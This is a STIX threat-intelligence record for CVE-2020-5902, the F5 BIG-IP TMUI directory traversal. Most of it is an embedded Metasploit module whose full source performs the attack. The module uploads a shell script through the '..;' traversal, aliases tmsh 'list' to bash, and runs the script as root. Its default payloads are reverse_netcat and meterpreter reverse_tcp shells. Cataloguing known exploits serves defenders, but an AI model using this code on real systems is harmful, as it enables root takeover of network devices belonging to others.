{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--04807fd1-5707-4882-ba4e-c25d65848981",
    "created": "2024-08-14T17:04:27.359029Z",
    "modified": "2024-08-14T17:04:27.359033Z",
    "name": "F5 BIG-IP TMUI Directory Traversal and File Upload RCE",
    "description": " This module exploits a directory traversal in F5's BIG-IP Traffic Management User Interface (TMUI) to upload a shell script and execute it as the Unix root user.  Unix shell access is obtained by escaping the restricted Traffic Management Shell (TMSH). The escape may not be reliable, and you may have to run the exploit multiple times. Sorry!  Versions 11.6.1-11.6.5, 12.1.0-12.1.5, 13.1.0-13.1.3, 14.1.0-14.1.2 15.0.0, and 15.1.0 are known to be vulnerable. Fixes were introduced in 11.6.5.2, 12.1.5.2, 13.1.3.4, 14.1.2.6, and 15.1.0.4.  Tested against the VMware OVA release of 14.1.2. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/f5_bigip_tmui_rce_cve_2020_5902.rb",
            "external_id": "f5_bigip_tmui_rce_cve_2020_5902.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-5902"
        },
        {
            "source_name": "reference",
            "url": "https://support.f5.com/csp/article/K52145254"
        },
        {
            "source_name": "reference",
            "url": "https://www.ptsecurity.com/ww-en/about/news/f5-fixes-critical-vulnerability-discovered-by-positive-technologies-in-big-ip-application-delivery-controller/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = AverageRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::FileDropper\n  include Msf::Exploit::Deprecated\n  moved_from 'exploit/linux/http/f5_bigip_tmui_rce'\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'F5 BIG-IP TMUI Directory Traversal and File Upload RCE',\n        'Description' => %q{\n          This module exploits a directory traversal in F5's BIG-IP Traffic\n          Management User Interface (TMUI) to upload a shell script and execute\n          it as the Unix root user.\n\n          Unix shell access is obtained by escaping the restricted Traffic\n          Management Shell (TMSH). The escape may not be reliable, and you may\n          have to run the exploit multiple times. Sorry!\n\n          Versions 11.6.1-11.6.5, 12.1.0-12.1.5, 13.1.0-13.1.3, 14.1.0-14.1.2,\n          15.0.0, and 15.1.0 are known to be vulnerable. Fixes were introduced\n          in 11.6.5.2, 12.1.5.2, 13.1.3.4, 14.1.2.6, and 15.1.0.4.\n\n          Tested against the VMware OVA release of 14.1.2.\n        },\n        'Author' => [\n          'Mikhail Klyuchnikov', # Discovery\n          'wvu' # Analysis and exploit\n        ],\n        'References' => [\n          ['CVE', '2020-5902'],\n          ['URL', 'https://support.f5.com/csp/article/K52145254'],\n          ['URL', 'https://www.ptsecurity.com/ww-en/about/news/f5-fixes-critical-vulnerability-discovered-by-positive-technologies-in-big-ip-application-delivery-controller/']\n        ],\n        'DisclosureDate' => '2020-06-30', # Vendor advisory\n        'License' => MSF_LICENSE,\n        'Platform' => ['unix', 'linux'],\n        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],\n        'Privileged' => true,\n        'Targets' => [\n          [\n            'Unix Command',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/reverse_netcat_gaping'\n              }\n            }\n          ],\n          [\n            'Linux Dropper',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :linux_dropper,\n              'DefaultOptions' => {\n                'CMDSTAGER::FLAVOR' => :bourne,\n                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'\n              }\n            }\n          ]\n        ],\n        'DefaultTarget' => 1,\n        'DefaultOptions' => {\n          'SSL' => true,\n          'WfsDelay' => 5\n        },\n        'Notes' => {\n          'Stability' => [SERVICE_RESOURCE_LOSS], # May disrupt the service\n          'Reliability' => [UNRELIABLE_SESSION], # Seems a little finicky\n          'SideEffects' => [IOC_IN_LOGS, CONFIG_CHANGES, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n\n    register_options([\n      Opt::RPORT(443),\n      OptString.new('TARGETURI', [true, 'Base path', '/'])\n    ])\n\n    register_advanced_options([\n      OptString.new('WritableDir', [true, 'Writable directory', '/tmp'])\n    ])\n  end\n\n  def check\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => dir_trav('/tmui/locallb/workspace/fileRead.jsp'),\n      'vars_post' => {\n        'fileName' => '/etc/f5-release'\n      }\n    )\n\n    unless res\n      return CheckCode::Unknown('Target did not respond to check.')\n    end\n\n    unless res.code == 200 && /BIG-IP release (?<version>[\\d.]+)/ =~ res.body\n      return CheckCode::Safe('Target did not respond with BIG-IP version.')\n    end\n\n    # If we got here, the directory traversal was successful\n    CheckCode::Vulnerable(\"Target is running BIG-IP #{version}.\")\n  end\n\n  def exploit\n    create_alias\n\n    print_status(\"Executing #{target.name} for #{datastore['PAYLOAD']}\")\n\n    case target['Type']\n    when :unix_cmd\n      execute_command(payload.encoded)\n    when :linux_dropper\n      execute_cmdstager(temp: datastore['WritableDir'])\n    end\n  ensure\n    delete_alias if @created_alias\n  end\n\n  def create_alias\n    print_status('Creating alias list=bash')\n\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => dir_trav('/tmui/locallb/workspace/tmshCmd.jsp'),\n      'vars_post' => {\n        'command' => 'create cli alias private list command bash'\n      }\n    )\n\n    if res.nil? || (error = parse_error(res))\n      case error\n      when /private \"list\" \\(list\\) already exists/\n        print_error('Alias \"list\" already exists, deleting it')\n        delete_alias\n\n        # Try to create the alias again\n        return create_alias\n      when /java\\.lang\\.NullPointerException/\n        print_error('Encountered java.lang.NullPointerException, retrying!')\n\n        # XXX: Try to create the alias until we're successful\n        return create_alias\n      end\n\n      fail_with(Failure::UnexpectedReply,\n                \"Failed to create alias list=bash#{error}\")\n    end\n\n    @created_alias = true\n\n    print_good('Successfully created alias list=bash')\n  end\n\n  def execute_command(cmd, _opts = {})\n    vprint_status(\"Executing command: #{cmd}\")\n\n    upload_script(cmd)\n    execute_script\n  end\n\n  def upload_script(cmd)\n    print_status(\"Uploading #{script_path}\")\n\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => dir_trav('/tmui/locallb/workspace/fileSave.jsp'),\n      'vars_post' => {\n        'fileName' => script_path,\n        'content' => cmd\n      }\n    )\n\n    if res.nil? || (error = parse_error(res))\n      fail_with(Failure::UnexpectedReply,\n                \"Failed to upload #{script_path}#{error}\")\n    end\n\n    register_file_for_cleanup(script_path)\n\n    print_good(\"Successfully uploaded #{script_path}\")\n  end\n\n  def execute_script\n    print_status(\"Executing #{script_path}\")\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => dir_trav('/tmui/locallb/workspace/tmshCmd.jsp'),\n      'vars_post' => {\n        'command' => \"list #{script_path}\"\n      }\n    }, 3.5)\n\n    # No response may mean the service is blocking on payload execution\n    return unless res && (error = parse_error(res))\n\n    case error\n    when /unexpected argument/\n      print_error('Alias \"list\" does not exist, attempting to create it again')\n      create_alias\n\n      # Try to execute the script again... smdh\n      return execute_script\n    when /java\\.lang\\.NullPointerException/\n      print_error('Encountered java.lang.NullPointerException, retrying!')\n\n      # XXX: Try to execute the script until we're successful\n      return execute_script\n    end\n\n    print_error(\"Failed to execute #{script_path}#{error}\")\n  end\n\n  def delete_alias\n    print_status('Deleting alias list=bash')\n\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => dir_trav('/tmui/locallb/workspace/tmshCmd.jsp'),\n      'vars_post' => {\n        'command' => 'delete cli alias private list'\n      }\n    )\n\n    if res.nil? || (error = parse_error(res))\n      case error\n      when /user alias \\(list admin\\) was not found/\n        print_good('Alias \"list\" does not exist or was already deleted')\n        return\n      when /java\\.lang\\.NullPointerException/\n        print_error('Encountered java.lang.NullPointerException, retrying!')\n\n        # XXX: Try to delete the alias until we're successful\n        return delete_alias\n      end\n\n      print_warning(\"Failed to delete alias list=bash#{error}\")\n      return\n    end\n\n    print_good('Successfully deleted alias list=bash')\n  end\n\n  def parse_error(res)\n    return unless res\n\n    error =\n      case res.code\n      when 200\n        res.get_json_document['error']\n      when 500\n        # This is usually a java.lang.NullPointerException stack trace\n        res.get_html_document.at('//pre')&.text\n      else\n        res.body\n      end\n\n    return if error.blank?\n\n    \":\\n#{error.strip}\"\n  end\n\n  def dir_trav(path)\n    # PoC courtesy of the referenced F5 advisory: <LocationMatch \".*\\.\\.;.*\">\n    normalize_uri(target_uri.path, '/tmui/login.jsp/..;', path)\n  end\n\n  def script_path\n    @script_path ||=\n      normalize_uri(datastore['WritableDir'], rand_text_alphanumeric(8..42))\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2020-06-30, # Vendor advisory",
    "x_mitre_platforms": [
        "linux'"
    ]
}